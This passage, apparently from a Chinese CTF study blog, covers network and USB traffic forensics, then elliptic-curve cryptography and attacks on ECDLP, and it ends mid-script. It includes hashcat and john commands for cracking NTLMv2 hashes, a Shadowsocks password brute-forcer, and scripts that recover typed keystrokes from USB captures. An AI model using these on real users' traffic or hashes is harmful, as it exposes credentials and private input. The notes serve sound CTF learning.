过滤IP地址： 123host 192.168.1.1src host 192.168.1.1dst host 192.168.1.1 过滤端口： 1234port 80!port 80dst port 80src port 80 过滤协议： 12arpicmp 结合逻辑符号综合过滤 1host 192.168.1.1 &amp;&amp; port 8080 显示过滤器过滤IP地址： 123ip.addr == 192.168.1.1 过滤该地址的包ip.src == 172.16.1.1 过滤源地址为该地址的包ip.dst == 172.16.1.1 过滤目标地址为该地址的包 过滤端口： 123tcp.port == 80 过滤tcp中端口号为80的包tcp.flags.syn == 1 过滤syn请求为1的包tcp.flags.ack == 1 过滤ack请求为1的包 结合逻辑符综合过滤： 1ip.src == 192.168.1.1 and ip.dst == 172.16.1.1 常用Nmap扫描出的靶机开放的端口 TCP协议的三次握手 第一次：发送 SYN 包 第二次：服务器收到SYN包 同时自己也发一个SYN包 即 SYN+ACK 包 此时服务器进入SYN_RECV状态 第三次：客户端收到服务器的包 向服务器发送确认包 ACK 完成三次握手 因此可以得知：SYN标志表示建立连接，ACK表示响应，查看开放端口，肯定会返回ACK标志，找 端口即为找ACK标志 wireshark： ip.src == 192.168.204.133 &amp;&amp; tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 1 tcpdump： tcpdump -n -r 1.pcapng &#39;ip src 192.168.204.133 and tcp[13] =18&#39; | awk &#39;&#123;print $3&#125;&#39; | sort -u ​ USB流量工具：knm 键盘流量USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。其中键盘击键信息集中在第三个字节中。键位映射关系参考：《USB键盘协议中键码》中的HID Usage ID。 步骤： tshark命令提取cap data tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt（去空行） 将数据还原成键位 提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]。 加冒号： 1234567891011121314151617f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==16: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close() 还原键位： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465normalKeys = &#123; &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;, &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;, &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;, &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;, &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;, &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;, &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123; &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;, &quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;, &quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;, &quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;, &quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#x27;out.txt&#x27;)for line in keys: try: if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;: continue if line[6:8] in normalKeys.keys(): output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;] else: output += [&#x27;[unknown]&#x27;] except: passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)): try: a=output.index(&#x27;&lt;DEL&gt;&#x27;) del output[a] del output[a-1] except: passfor i in range(len(output)): try: if output[i]==&quot;&lt;CAP&gt;&quot;: flag+=1 output.pop(i) if flag==2: flag=0 if flag!=0: output[i]=output[i].upper() except: passprint (&#x27;output :&#x27; + &quot;&quot;.join(output)) ​ 鼠标流量USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节。 第一个字节代表按键，当取0x00时代表没有按键，为0x01时代表按左键，为0x02时代表按右键。 第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。 第三个字节与第二字节类似，代表垂直上下移动的偏移。 步骤： tshark命令提取cap data tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt tshark -r usb.pcap -T fields -e usb.capdata | sed &#39;/^\\s*$/d&#39; &gt; usbdata.txt（去空行） 将鼠标数据还原鼠标移动轨迹 提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]。 加冒号： 1234567891011121314151617f=open(&#x27;usbdata.txt&#x27;,&#x27;r&#x27;)fi=open(&#x27;out.txt&#x27;,&#x27;w&#x27;)while 1: a=f.readline().strip() if a: if len(a)==8: out=&#x27;&#x27; for i in range(0,len(a),2): if i+2 != len(a): out+=a[i]+a[i+1]+&quot;:&quot; else: out+=a[i]+a[i+1] fi.write(out) fi.write(&#x27;\\n&#x27;) else: breakfi.close() 测试信息隐藏位置 123456789101112131415161718192021222324nums = []keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)posx = 0posy = 0for line in keys: if len(line) != 12 : continue x = int(line[3:5],16) y = int(line[6:8],16) if x &gt; 127 : x -= 256 if y &gt; 127 : y -= 256 posx += x posy += y btn_flag = int(line[0:2],16) # 1 for left , 2 for right , 0 for nothing if btn_flag == 2 : # 1 代表左键 f.write(str(posx)) f.write(&#x27; &#x27;) f.write(str(posy)) f.write(&#x27;\\n&#x27;)f.close() gnuplot将坐标转化成图像 gnuplot gnuplot&gt; plot &quot;xy.txt&quot; ​ TLS流量解密：Wireshark首选项 - TLS - RSA keys list - Edit… - TLS Decrypt ​ NTLMNet-NTLM-v2-Hash 格式： [User name]::[Domain name]:[NTLM Server Challenge]:[NTLM Response] 其中 NTLM Response 由 NTProofStr+blob 两部分组成，即： [User name]::[Domain name]:[NTLM Server Challenge]:[NTLM ProofStr]:[Blob] 爆破： john hash.txt --wordlist=rockyou.txt hashcat -m 5600 [HASH] rockyou.txt -o result.txt --force hashcat -a 0 -m 1000 209c6174da490caeb422f3fa5a7ae634 pass.txt ​ Shadowsocks参考：使用主动探测方法识别 Shadowsocks 服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python3# encoding: utf-8import osimport sysimport loggingimport hashlibfrom Crypto.Cipher import AESlogging.basicConfig(level=logging.INFO)def EVP_BytesToKey(password, key_len, iv_len): m = [] i = 0 while len(b&#x27;&#x27;.join(m)) &lt; (key_len + iv_len): md5 = hashlib.md5() data = password if i &gt; 0: data = m[i - 1] + password md5.update(data) m.append(md5.digest()) i += 1 ms = b&#x27;&#x27;.join(m) key = ms[:key_len] iv = ms[key_len:key_len + iv_len] return key, ivdef decrypt(cipher,password): key_len = int(256/8) iv_len = 16 mode = AES.MODE_CFB key, _ = EVP_BytesToKey(password, key_len, iv_len) cipher = bytes.fromhex(cipher) iv = cipher[:iv_len] real_cipher = cipher[iv_len:] obj = AES.new(key, mode, iv, segment_size=128) plain = obj.decrypt(real_cipher) return plaindef main(): # test http request cipher = &#x27;&#x27; with open(&#x27;rockyou.txt&#x27;,&#x27;rb&#x27;) as f: lines = f.readlines() for password in lines: plain = decrypt(cipher,password.strip()) if b&#x27;HTTP&#x27; in plain: print(password,plain)if __name__ == &quot;__main__&quot;: main() ​ MPEG-TS / H.264UDP流，传输格式是MPEG-TS，编码格式为H.264，说明传输的是ts流。 先从流量包中提取 UDP 流并保存为文件： tshark -r password.pcapng -Y &quot;udp.port == 5555&quot; -T fields -e data &gt; udp_stream.txt 将提取的十六进制数据转换为二进制文件，保存为 extracted_video.ts。 使用 ffmpeg 将提取的 TS 文件转换为 MKV 文件： ffmpeg -i extracted_video.ts -c copy recovered.mkv","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"流量","slug":"流量","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E9%87%8F/"},{"name":"USB","slug":"USB","permalink":"https://lazzzaro.github.io/tags/USB/"}],"author":"Lazzaro"},{"title":"ECC","slug":"crypto-ECC","date":"2020-11-07T11:33:18.000Z","updated":"2025-04-23T13:48:47.730Z","comments":true,"path":"2020/11/07/crypto-ECC/","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-ECC/","excerpt":"","text":"ECC椭圆曲线密码学（英语：Elliptic Curve Cryptography，缩写：ECC）是一种基于椭圆曲线数学的公开密钥加密算法。与传统的基于大质数因子分解困难性的加密方法不同，ECC 依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有以素数为模的整数域 $\\text{GF}(p)$和特征为2的伽罗华域 $\\text{GF}(2^m)$。 ​ 椭圆曲线椭圆曲线的定义式：$y^2+axy+by=x^3+cx^2+dx+e$ 一般方程：$y^2+a_1xy+a_3y=x^3+a_2x^2+a_4x+a_6$ 最常用方程（维尔斯特拉斯标准形式）$y^2=x^3+ax+b$，判别式 $\\Delta=-16(4a^3+27b^2)\\neq 0$ 椭圆曲线的定义也要求曲线是非奇异的。几何上来说，这意味着图像里面没有尖点、自相交或孤立点。代数上来说，这成立当且仅当判别式 $\\Delta \\neq 0$。 还需要一个无穷远点作为曲线的一部分，用 $\\text{O}$ 表示。 椭圆曲线表达式$\\{(x,y) \\in \\mathbb{R}^2 \\mid y^2=x^3+ax+b,4a^3+27b^2\\neq0\\} \\cup \\{\\text{O}\\}$ 椭圆曲线阿贝尔群$\\text{O}$ 为零元，相反数 $P$ 为关于X轴对称的另一边的点，加法规则为直线三点 $P+Q+R=0$。 几何加法普通相交三点：$P+Q+R=0$ 普通相交两点：$P+P+Q=0$，$P+Q+Q=0$ （一点相切） 垂直相交两点：$P+Q+0=0$ （垂直X轴） 垂直相交一点：$P+P+0=0$ （垂直X轴+一点相切） 代数加法去掉特殊情况，只考虑两个非零非对称的点 $P=(x_P,y_P)$ 和 $Q=(x_Q,y_Q)$。 若 $P$ 和 $Q$ 不同，即 $x_P \\neq x_Q$，直线斜率 $k=\\cfrac{y_P-y_Q}{x_P-x_Q}$ 若 $P$ 和 $Q$ 相同，即 $x_P =x_Q$，直线斜率 $k=\\cfrac{3x_P^2+a}{2y_P}$ 这条直线和椭圆曲线的交点 $R=(x_R,y_R)$，则： $x_R=k^2-x_P-x_Q$ $y_R=y_P+k(x_R-x_P)=y_Q+k(x_R-x_Q)$ 于是：$P+Q=(x_P,y_P)+(x_Q,y_Q)=-R=(x_R,-y_R)$ 标量积（点积/数乘/倍乘）$Q=nP=P+P+\\cdots+P=\\sum_{i=0}^{n-1}(b_i\\cdot2^i)P,\\quad b_i=\\{0,1\\}$，$b_i$ 为 $n$ 的各比特位值。 对数$Q=nP$，已知 $Q,P$，求 $n$。 ​ 有限域椭圆曲线椭圆曲线是连续的，并不适合用于加密，所以必须把椭圆曲线变成离散的点，把椭圆曲线定义在有限域上。 有限域上的椭圆曲线是指在椭圆曲线的定义式中，所有的系数都是在某个有限域 $\\text{GF}(p)$ 中的元素，其中 $p$ 为一个大素数。 给出一个有限域 $\\text{F}p$， $\\text{F}p$ 中有 $p$（$p$ 为质数）个元素 $0,1,2,\\cdots,p-1$； $\\text{F}p$ 的加法是 $a+b \\equiv c \\pmod p$； $\\text{F}p$ 的乘法是 $a\\times b \\equiv c \\pmod p$； $\\text{F}p$ 的除法是 $\\cfrac{a}{b} \\equiv c \\pmod p$，即 $a \\times b^{-1} \\equiv c \\pmod p$，$b^{-1}$ 为 $b$ 的逆元，满足 $b \\times b^{-1} \\equiv 1 \\pmod p$； $\\text{F}p$ 的单位元是 $1$，零元是 $\\text{O}$； $\\text{F}p$ 域内运算满足交换律、结合律、分配率。 椭圆曲线 $\\text{E}p(a,b)$，$p$ 为质数，$x,y \\in [0,p-1]$：$y^2=x^3+ax+b \\pmod p$， 选择两个满足下列约束条件的小于 $p$ 的非负整数 $a,b$：$4a^3+27b^2 \\neq 0 \\pmod p$。 $\\text{F}p$ 上的椭圆曲线同样有加法： 无穷远点 $\\text{O}$ 是零元，有 $\\text{O}+\\text{O}=\\text{O}$，$\\text{O}+P=P$； $P(x,y)$ 的负元是 $(x,-y \\bmod p)=(x,p-y)$，有 $P+(-P)=\\text{O}$； $P(x_1,y_1),Q(x_2,y_2)$ 的和 $R(x_3,y_3)$ 有如下关系： $x_3 \\equiv k^2-x_1-x_2 \\pmod p$ $y_3 \\equiv k(x_1-x_3)-y_1 \\pmod p$ 若 $P=Q$ 则 $k=\\cfrac{3x_1^2+a}{2y_1}\\pmod p$； 若 $P \\neq Q$ 则 $k=\\cfrac{y_2-y_1}{x_2-x_1} \\pmod p$。 曲线的阶找到一个最小的 $s$ 满足 $s=|k−j|$，其中 $kP=jP$。 点的阶如果椭圆曲线上一点 $P$，存在最小的正整数 $n$ 使得数乘 $nP=\\text{O}$ ，则将 $n$ 称为 $P$ 的阶；若 $n$ 不存在，则 $P$ 是无限阶的。 加密原理考虑 $K=kG$ ，其中 $K,G$ 为椭圆曲线 $\\text{E}p(a,b)$ 上的点，$n$ 为 $G$ 的阶（$nG=\\text{O}$），$k$ 为小于 $n$ 的整数。 给定 $k$ 和 $G$ ，根据加法法则，计算 $K$ 很容易，但反过来，给定 $K$ 和 $G$，求 $k$ 就非常困难。因为实际使用中的ECC原则上把 $p$ 取得相当大，$n$ 也相当大，要把 $n$ 个解点逐一算出来列成上表是不可能的。 这就是椭圆曲线加密算法的数学依据。 点 $G$ 称为基点 (base point)，$k$ ($k&lt;n$) 为私有密钥 (private key)，$K$ 为公开密钥 (public key)。 通信算法 A选定一条椭圆曲线 $\\text{E}p(a,b)$，并取椭圆曲线上一点作为基点 $G$； A选择一个私有密钥 $k$ ($k&lt;n$)，并生成公开密钥 $K=kG$； A将 $\\text{E}p(a,b)$ 和点 $K,G$ 传给B； B收到信息后，将待传输的明文编码到 $\\text{E}p(a,b)$ 上的一点 $M$，并产生一个随机整数 $r$（$r&lt;n$，$n$ 为 $G$ 的阶数）； B计算点 $C_1=M+rK$ 和 $C_2=rG$； B将 $C_1,C_2$ 传给A； A收到信息后，计算 $C_1-kC_2$，结果就应该是点 $M$。 （$C_1-kC_2=M+rK-krG=M+rkG-krG=M$） 123456789101112131415161718192021222324252627282930#Sagea = b = p = #EllipticCurve([a1, a2, a3, a4, a6]) -- y^2+(a1)xy+(a3)y=x^3+(a2)x^2+(a4)x+(a6)E = EllipticCurve(GF(p), [0, 0, 0, a, b])base = E([, ])pub = E([, ])c1 = E([, ])c2 = E([, ])X = base#Bruteforce secret kfor i in range(1, n): if X == pub: k = i print(&quot;[+] secret k = &quot;, i) break else: X = X + basem = c2 - (c1 * k)print(&quot;[+] x = &quot;, m[0])print(&quot;[+] y = &quot;, m[1])print(&quot;[+] x+y = &quot;, m[0] + m[1]) ​ 代码实现生成ECC密钥12345678910111213141516171819202122from Crypto.PublicKey import ECC#生成ECC密钥key = ECC.generate(curve=&#x27;NIST P-256&#x27;) #使用椭圆曲线NIST P-256#输出密钥（包括私钥k，基点G）print(key)#公钥（point_x，point_y是基点G的坐标）print(key.public_key())#椭圆曲线print(key.curve)#私钥kprint(key.d)#导出为pem密钥文件print(key.export_key(format=&#x27;PEM&#x27;))#导入密钥文件key = ECC.import_key(f.read()) 查询公开椭圆曲线参数12345678910import fastecdsa.curve as curve#P-384的acurve.P384.a#P-384的bcurve.P384.b#P-384的pcurve.P384.p ​ 坐标系转换雅可比射影坐标将仿射坐标系（笛卡尔坐标系）进行一定转换，使得椭圆曲线上两点相加避免求逆运算，转换关系为： 仿射坐标转换为雅可比坐标：$(X,Y)\\to (X,Y,1)$ 雅可比坐标转换为仿射坐标：$(X,Y,Z)\\to (X/Z^2,Y/Z^3)$ ​ 参考ECC椭圆曲线加密算法：介绍 ECC椭圆曲线详解(有具体实例) 有限域椭圆曲线定义与计算方式 ECC椭圆曲线密码学的原理、公式推导、例子、Python实现和应用 ​ 常见攻击倍点爆破爆破加法，避免重复计算。 12345for i in trange(2, 2^20): base += P if base == Q: print(base) break Smart’s attack适用情况：椭圆曲线的阶和素数 $p$ 恰好相等，$\\text{E.order}()=p$。 123456789101112131415161718192021222324252627282930313233p = A = B = E = EllipticCurve(GF(p),[A,B])P = E(,)Q = E(,)def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k)r = SmartAttack(P, Q, p)print(r) MOV attack适用情况：$\\text{E.order}()=p+1$。 使用双线性配对，使得原 ECDLP 问题变为了 DLP 问题，最重要的意义在于实质证明了 ECDLP 问题与 DLP 问题是等价的。但实际上由于问题等价，故实际不会使用该算法进行攻击。 虽然在计算上 DLP 问题的求解要比 ECDLP 问题的求解稍微快一些，少了许多不必要的消耗。 12345678910111213141516171819202122a = b = p = Fp = GF(p)E = EllipticCurve(Fp, [a, b])G = E(, )P = E(, )order = E.order()k = 1while (p**k - 1) % order: k += 1K.&lt;a&gt; = Fp.extension(k)EK = E.base_extend(K)PK = EK(P)GK = EK(G)QK = EK.lift_x(a + 3) # Independent from PKAA = PK.tate_pairing(QK, E.order(), k)GG = GK.tate_pairing(QK, E.order(), k)r = AA.log(GG)print(r) Invalid curve attack服务端并没有检查输入的点是否在原曲线 $E:y^2 = x^3 + ax + b \\pmod p$ 上，存在 Invalid Curve Attack。 由于 Elliptic Curve 的点加运算、标量乘法都与 $E$ 的参数 $b$ 无关，只与 $a$ 有关，所以可以通过平移曲线 $E$ 到 $E’:y^2 = x^3 + ax + b’ \\pmod p$ 上，这样不会改变群的运算，但是 $E’$ 的阶会发生改变，只要 $E’$ 的阶足够光滑，或者有小的素因子，就可以求解（子群上）DLP，最后再用 CRT 恢复出服务端私钥。一般来说阶的最大素因子小于 $2^{50}$ ，就能很快（几分钟）跑出 DLP。 1234567891011121314151617181920212223242526272829303132333435363738394041def get_invalid_point(p, a, known_factors = [], check_point = False): &quot;&quot;&quot; Input: the prime p, the fixed curve parameter a, and the already know factors that we do not want to repeat. Optionally we can check how much does it take to solve the dlp for a point before returning it with check_point=True. Output: an invalid point Q, the parameter b defining its curve, and the factors of its order. &quot;&quot;&quot; while True: b = randint(1, p) E = EllipticCurve(GF(p), [a, b]) order = E.order() factors = prime_factors(order) # Compute the best order we can get from a point good_factors = [] for f in factors: if f.nbits() &lt;= 40 and not f in known_factors: good_factors.append(f) cof = prod(good_factors) if cof.nbits() &gt;= 50: print(f&#x27;Found curve&#x27;) break # Now that we have a good curve, we need to find the point G = E.gen(0) * (order // cof) assert G.order() == cof if check_point: # Sanity check that we can actually solve the invalid dlp r = randint(1, cof) Q = G*r print(f&#x27;Solving dlog for &#123;cof.nbits()&#125; bits order&#x27;) tic = time() dlog = G.discrete_log(Q) assert dlog == r, (r, dlog) print(f&#x27;Done in &#123;round(time() - tic, 2)&#125; s&#x27;) return G, b, good_factors 参考： LakeCTF 2023 - keysharer NCTF 2023 - Code Infinite ​ ECDLPECDLP即椭圆曲线上的离散对数问题（The Elliptic Curve Discrete Logarithm Problem）。 椭圆曲线上离散对数问题ECDLP定义如下：给定素数 $p$ 和椭圆曲线 $E$，对 $Q=kP$，在已知 $P,Q$ 的情况下求出小于 $p$ 的正整数 $k$。可以证明由 $k$ 和 $P$ 计算 $Q$ 比较容易，而由 $Q$ 和 $P$ 计算 $k$ 则比较困难。 目前已知最快的解决椭圆离散对数问题的算法大约需要在 $\\sqrt{p}$ 步，所以当 $p$ 足够大时，椭圆曲线加密具有安全性。 将椭圆曲线中的加法运算与离散对数中的模乘运算相对应，将椭圆曲线中的乘法运算与离散对数中的模幂运算相对应，我们就可以建立基于椭圆曲线的对应的密码体制。 12345678910111213141516171819#Sage Code 1p = a = b = E = EllipticCurve(GF(p),[a,b])P = E(, ) Q = E(, ) k = discrete_log(Q, P, operation=&#x27;+&#x27;) print(k)#Sage Code 2p = a = b = E = EllipticCurve(GF(p),[a,b])P = E(, ) Q = E(, ) k = P.discrete_log(Q)print(k) Pohlig-Hellman算法算法由Pohlig和Hellman发明，这是一种为解决离散对数问题而提出的攻击方法，早在1978年就被提出。主要思想是对阶数进行分解，比如整数域中 $y = g^x \\pmod p$ 里的 $x$ 以及椭圆曲线离散对数问题中 $Gk = Q$ 的 $G$ 的阶 $n$，这样就把对应的离散对数问题转移到了每个因子条件下对应的离散对数，然后可以利用中国剩余定理进行求解。 假设需要求解的式子为 $Q=lP$，其中 $P$ 为选取的一个基点， $l$ 为选定的随机数，相当于要求解的私钥。 首先求得 $P$ 的阶 $n$ ，即可使得 $nP$ 不存在的最小正整数，将 $n$ 进行分解，设 $n=p_1^{e_1}p_2^{e_2}\\cdots p_r^{e_r}$， 将因子取出，计算 $l_i \\equiv l \\pmod {p_i^{e_i}},\\quad i \\in [1,r]$，即 $\\begin{cases} l \\equiv l_1 \\pmod {p_1^{e_1}} \\newline l \\equiv l_2 \\pmod {p_2^{e_2}} \\newline {\\vdots} \\newline l \\equiv l_r \\pmod {p_r^{e_r}} \\end{cases}$ 如果得到 $l_i(i \\in [1,r])$ 的值就能使用中国剩余定理进行求解得到 $l$，下面求解 $l_i$。 首先将 $l_i$ 设为 $p_i$ 表示的多项式 $l_i=z_0+z_1p_i+z_2p_i^2+ \\cdots +z_{e-1}p_i^{e-1}, \\quad z \\in [0,p_i-1]$， 为计算 $z_i$，分别取 $P_0$ 和 $Q_0$，并取值 $P_0=\\cfrac{n}{p_i}P,\\quad Q_0=\\cfrac{n}{p_i}Q$， 这样有 $p_iP_0=nP$，则可得到 $Q_0=\\cfrac{n}{p_i}Q=\\cfrac{n}{p_i}(lP)=l(\\cfrac{n}{p_i}P)=lP_0$，相当于在原表达式的两边乘上 $\\cfrac{n}{p_i}$， 再转回 $l_i$，先求解 $z_0$： $l_iP=Q \\\\\\Rightarrow l_iP_0=Q_0 \\\\\\Rightarrow (z_0+z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow z_0P_0=Q_0$ 这时便将在 $P$ 域上的离散对数分解到了 $P_0$ 域上，因为 $P_0$ 的阶是 $p_i$，已经较原本的阶 $n$ 运算的复杂度小了很多，当然，除非 $n$ 本身就是个大素数。 求得 $z_0$，再代回原式： $(z_0+z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow z_0P_0+(z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0 \\\\\\Rightarrow (z_1p_i+\\cdots+z_{e-1}p_i^{e-1})P_0=Q_0-z_0P_0 \\\\\\Rightarrow z_1p_i=Q_0-z_0P_0$ 此时就可以求解 $z_1$，然后依次将 $z_i$ 全部算出来，这样我们就得到了 $l_1$，然后便可以代入前面的等式，将 $l_i$ 都求出后即可利用中国剩余定理求出 $l$。 123456789101112131415161718192021222324252627282930313233343536#Sage Code 1p = a = b = gx = gy = px = py = E = EllipticCurve(GF(p), [a, b])G = E(gx, gy)n = E.order()QA = E(px, py)factors = list(factor(n))m = 1moduli = 